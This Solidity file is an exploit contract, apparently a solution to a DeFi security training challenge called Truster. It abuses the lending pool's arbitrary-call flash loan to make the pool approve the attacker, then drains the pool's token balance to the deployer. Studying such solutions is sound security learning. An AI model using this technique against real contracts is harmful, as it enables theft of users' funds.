// SPDX-License-Identifier: MIT
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

pragma solidity ^0.8.0;

contract TrusterAttack{
    IERC20 public immutable token;
    TrusterLenderPool public immutable pool;
    address payable immutable owner;

    constructor(address _token, address  _poolAddress){
        token = IERC20(_token);
        pool = TrusterLenderPool(_poolAddress);
        owner = payable(msg.sender);
    }
    
    function attack(uint256 _amount) public{
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this),_amount);
        pool.flashLoan(0,msg.sender,address(token),data);

        token.transferFrom(address(pool), owner, token.balanceOf(address(pool)));
    }
}